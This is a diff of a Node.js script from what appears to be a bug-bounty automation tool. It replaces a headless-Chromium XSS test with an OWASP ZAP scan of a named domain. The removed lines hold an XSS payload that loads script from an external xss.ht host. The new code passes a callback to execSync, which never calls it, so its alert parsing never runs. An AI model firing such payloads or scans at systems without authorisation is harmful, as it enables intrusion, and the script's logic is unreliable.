@@ -1,23 +1,35 @@
-var cmd = require('./recon/amass.js')
-var util =require ('./utils.js')
-var url = require('url')
-var path = require('path')
+var util = require('./utils.js')
 
-var spawnHeadlessChromium = require('run-headless-chromium').spawn;
+var proc = require('child_process')
 
-var proc = spawnHeadlessChromium([
-    // Flags forwarded to Chromium:
-    'http://127.0.0.1:8989/?xss="><script src=https://nadino.xss.ht></script>',
-], {
-    stdio: 'inherit',
-});
-proc.on('close', function() {
-    clearTimeout(delayedExit);
-    console.log('Headless Chromium exited!');
-});
-var delayedExit = setTimeout(function() {
-    console.log('Chrome did not exit within a few seconds, sending SIGINT...');
-    // Graceful exit - allow run-headless-chromium to exit Chrome and Xvfb.
-    proc.kill('SIGINT');
-    // If you do proc.kill(); then Chrome and Xvfb may still hang around.
-}, 5000);
+var acceptedRisk = ["High","Medium"]
+
+console.log("start")
+
+var stdout2 = "acasa"
+
+proc.execSync("python3 $BBDIR/src/attack/zap.py https://dk.ciao.com", {maxBuffer: 100*1024*1024}, async (error, stdout, stderr) => {
+  if (error) {
+      util.debug(`error: ${error.message}`)
+      //we will log what happened
+      return
+  }
+
+  stdout2=stdout
+
+  console.log("qualcosa "+stderr+" " +stdout+" "+ error)
+
+  util.debug("ZAP STDOUT '"+stdout+"'")
+
+  var obj = JSON.parse(stdout)
+
+  for(var i=0; i < obj.length; i++){
+    var alert = obj[i]
+
+    if(acceptedRisk.includes(alert.risk)){
+      util.debug("FOUND!!! "+alert.risk+" bug => "+alert.alert+" on "+alert.url)
+    }
+  }
+})
+
+console.log(stdout2)
